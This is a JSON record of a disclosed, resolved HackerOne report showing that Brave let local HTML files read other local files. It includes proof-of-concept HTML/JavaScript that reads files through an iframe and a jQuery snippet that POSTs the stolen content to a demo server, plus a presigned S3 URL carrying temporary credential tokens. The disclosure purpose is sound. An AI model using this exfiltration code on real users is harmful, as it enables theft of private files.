@@ -1,0 +1,219 @@
+{
+  "id": 175979,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzU5Nzk=",
+  "url": "https://hackerone.com/reports/175979",
+  "title": "Access to local file system using javascript",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2016-10-15T11:27:39.225Z",
+  "submitted_at": "2016-10-15T11:27:39.225Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "karel_origin",
+    "url": "/karel_origin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/077/693/a209ab3606bc8a68fc577dc38b001c8f66b3d561_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15688,
+    "url": "https://hackerone.com/brave",
+    "handle": "brave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/688/2aad5641af643ee4f4402896e4747293f6e9c5ca_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Brave Software",
+      "twitter_handle": "brave",
+      "website": "https://brave.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-11-16T06:20:10.097Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-11-09T20:02:47.734Z",
+  "team_member_agreed_on_going_public_at": "2016-11-16T06:20:10.028Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey,\n\nThe browser can access the local files using iframes with a local html file. this is very normal and often used for local web development but javascript shouldn't be able to get the content of that iframe because this can be used to post the contents to the attackers server. something else I noticed is that it's not limited to the same directory.\n\n\n```\n<html>\n<body>\n<div id='div1'>\n</div>\n<script>\ncurrent_href = document.location.href\nframe = document.createElement('iframe'); frame.src = current_href.replace('/Downloads/test.html', '/Desktop/Desktop.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)\nsetTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML\nalert('Your data is: ' + loot)\n}, 500)\n</script>\n</body>\n</html>\n```\n\nI was able to do this with some simple html as you can see above.\nThis loads a file called 'Desktop.txt' from the downloads folder and creates an alert message with the file content. I would have been able to post it to my server using jquery like this:\n\n```\n//Gets data from iframe and saves it to the getdata variable\ngetdata = document.getElementsByTagName('frm')[0].contentWindow.document.getElementsByTagName('pre')[0].innerHTML\n//Posts to the php server located at 192.168.0.106 (local address for demo purposes)\n$.ajax({type: \"POST\", url: \"http://192.168.0.106/post.php\", data: {string:getdata}});}\n```\n\n```\n//Can be retrieved with php using:\n$_POST['string'];\n```\n\nThis only works if the html file is opened locally as i mentioned earlier,\nKarel.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 128115,
+      "file_name": "Screen_Shot_2016-10-15_at_13.20.12.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/128/115/2f14407be04bc4479b02fb8566c65b591368ca78/Screen_Shot_2016-10-15_at_13.20.12.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-10-15_at_13.20.12.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-10-15_at_13.20.12.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5Y2DP3IQ%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T064908Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEMVXZNDQibmhGabFwlu15hHolG3fFz28OfByjNQmusZAiEAzo9uerCOZrMpaEqwEKNQ2rgFpCDKsmZxDszzdu68yHIqugUIgP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDBA5Z86PZbcRZ8M4NiqOBRbKOZRjE1GpeSxOqklLcICqwOHqkk3A36%2FELHbvy0giA4bw6XB3vjJKhAUZBWnismBuFX%2FsEmxXW5Ih%2F8w0ftJ3DOw0QawB5pcWq1JMmyDgktK8hg4Puu%2BXT6HtGuNsnwhSav9Nl8FPNFUaW0FmLOyCGenpMLs3Jyt1%2BMPZVVSGb7cM0AOmd3l%2BgvqZVdsbNAu2ueY3jil3dsXH2FZPZgLaF%2FqRfsc962r7TR5to2Ow5jxVZohjG1GUkxnSm8ZMHKZRY4tEUZzzUVbb041C1ezfBV%2BC9iODZpde6LGN8APCG2hdiIFlJkbb3mbzotOGeE0CAE1VryZEpSAeaFUa3oQQdwOq0EMgLb1QuDeODz4a%2FxKwCdjpcpugY03DPNHrY0o4yFn2e%2BTmOZb5uaM%2Fqz7Hn8h8SQdISXfzEAiAQ57%2F8WNlfa8jjsoClyd%2B%2BBZGavi6%2BbKehE8MnR%2FlvJbwu%2F1pf0%2FOyff%2FE0HQqYeXuczmhxzrapgM7KVOT9WLqqbWa0fSxybgLDets7X2RcsuOHip47vomliQpcdMhrjpOsoAr8aitDqWtgFOtb6Z4HzGP5dT3oT2uYyTaar63TMZ9uGa8Pjr0rs23%2F%2FxPbHvwx%2FUFNPPFRVbkiCKLgIcY%2BcR4t9tMeYqsOYYn17TOP1aOLBFN8RX3rEtjhNiB6LidWgUHB50ckYA4XtiLjyd8Db3%2BCt04oghi7lMkhEva46h9zz0NodEjEPonLB%2FN1XvX3VchA95A2nYZYqL6ypSv0tGPVO7bKzr7OSz6SdEzbO5Q%2FkvIkCIgkEuTiQwZVgEIQZifpd%2FJ1D5mpLyUkqhztT7pWicR29bQY67oqBUXaDORICp0iRLUl13ZBgwUWB8QzC%2B3bfSBjqxAd%2FngiZveJ5gw12DnSbZLUOaN%2BvogGN2Z7dtTD6t2XH4VbOFmwd6%2Fs%2BR5FPVl6xXjqcYiIWRkGaVVnVUiE2EmUWlc3xOsc%2F9LeXe8c6csslGnvnz%2B2MtuIgHHAIR3TWqw13M7AEjBPqt9KbPCjtSYqhejfGVz4GMsCLGbWbmleRIsDuoYmpiIuODSls9H7nKU%2Fds0iSXrjkIQHAOT5tPcf0LXj3PfZTk8XGgTpCDV1GSUA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=60c9b793179472e8c5c6f932e8e0997177dafbb1e118cdae75af9abb34be1b86",
+      "file_size": 34726,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-12-09T20:02:47.778Z",
+  "allow_singular_disclosure_after": -302179580.3479927,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "jensec",
+    "sp1d3rs",
+    "sameerphad72",
+    "b6117130df17feef13481e3",
+    "flashdisk",
+    "ajdumanhug",
+    "japz",
+    "paulos__",
+    "spetr0x",
+    "arice",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 2885,
+      "category": "researcher",
+      "content": "Brave Treated every local file as same-origin ('file://') giving local HTML files read access to other local files\n\n```\n<html>\n<body>\n<div id='div1'>\n</div>\n<script>\ncurrent_href = document.location.href\nframe = document.createElement('iframe'); frame.src = current_href.replace('/Downloads/test.html', '/Desktop/Desktop.txt'); frame.id = 'frm'; document.getElementById('div1').appendChild(frame)\nsetTimeout(function func(){loot = document.getElementById('frm').contentWindow.document.getElementsByTagName('pre')[0].innerHTML\nalert('Your data is: ' + loot)\n}, 500)\n</script>\n</body>\n</html>\n```\nThis would pop an alert box with the content of a file named 'Desktop.txt' located in the Desktop folder.\n\n```\n<html>\n<head>\n<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js\"></script>\n<script>$.getScript( \"data.txt\", function( data, textStatus, jqxhr ) {\n  document.write('<h1>Your data</h1><pre>' + data + '</pre>');\n});\n//This loads a file called 'data.txt' and prints the content\n</script>\n</head>\n<body>\n</body>\n</html>\n```\nThe HTML above could also be used to read the content of a file.",
+      "updated_at": "2016-11-09T20:02:07.519Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 77693,
+        "username": "karel_origin",
+        "name": "Karel Origin",
+        "bio": "Popping shells.",
+        "cleared": false,
+        "verified": false,
+        "website": "http://twitter.com/karel_origin",
+        "location": "Netherlands",
+        "created_at": "2016-05-16T11:21:42.706Z",
+        "url": "https://hackerone.com/karel_origin",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/077/693/a209ab3606bc8a68fc577dc38b001c8f66b3d561_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/077/693/a209ab3606bc8a68fc577dc38b001c8f66b3d561_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/077/693/a209ab3606bc8a68fc577dc38b001c8f66b3d561_original.jpg/5d27521e1b671a8e8bc4f016cace6a876120e5addf7dcc35ae4a5eac091669a9"
+        }
+      }
+    }
+  ],
+  "databaseId": "175979",
+  "votes": 13,
+  "latest_disclosable_activity_at": "2016-11-16T06:20:10.118Z",
+  "weakness": null,
+  "_metadata": {
+    "saved_at": "2026-07-08T14:49:08.240612",
+    "source": "https://hackerone.com/reports/175979.json",
+    "report_id": 175979
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzU5Nzk=",
+    "databaseId": "175979",
+    "title": "Access to local file system using javascript",
+    "url": "https://hackerone.com/reports/175979",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2016-11-16T06:20:10.097Z",
+    "created_at": "2016-10-15T11:27:39.225Z",
+    "submitted_at": null,
+    "weakness": null,
+    "severity": {
+      "rating": "medium",
+      "score": null
+    },
+    "reporter": {
+      "username": "karel_origin"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1Njg4",
+      "handle": "brave",
+      "name": "Brave Software",
+      "url": "https://hackerone.com/brave",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS8zNjAyMQ==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2016-10-25T21:38:42.747Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzE3NTk3OQ==",
+    "_id": "175979",
+    "disclosed": true,
+    "votes": 13,
+    "latest_disclosable_activity_at": "2016-11-16T06:20:10.118Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzU5Nzk=",
+      "databaseId": "175979",
+      "title": "Access to local file system using javascript",
+      "url": "https://hackerone.com/reports/175979",
+      "disclosed_at": "2016-11-16T06:20:10.097Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzE1Njg4",
+      "handle": "brave",
+      "name": "Brave Software",
+      "url": "https://hackerone.com/brave",
+      "currency": "usd"
+    }
+  }
+}
